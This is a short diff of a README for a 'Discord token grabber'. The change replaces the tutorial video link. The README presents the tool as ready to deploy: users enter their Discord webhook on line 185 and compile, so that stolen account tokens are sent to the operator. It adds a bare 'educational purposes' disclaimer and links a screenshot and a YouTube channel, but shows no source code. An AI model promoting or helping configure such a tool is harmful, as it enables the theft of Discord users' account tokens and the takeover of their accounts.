@@ -1,6 +1,6 @@
 > # __**DISCORD TOKEN GRABBER**__<br>
 
-**TUTORIAL VIDEO : https://www.youtube.com/watch?v=QJXf2JL5NYE**<br>
+**TUTORIAL VIDEO : https://www.youtube.com/watch?v=dpru64NY2d0**<br>
 **Only made for educational purposes.**<br>
 You only have to input your Discord webhook on line 185 and compile it.<br>
 [![Token](https://media.discordapp.net/attachments/893378078573748235/919187469549834281/Screenshot_2021-12-11_180032.png)](https://youtube.com/VENAX59)<br>
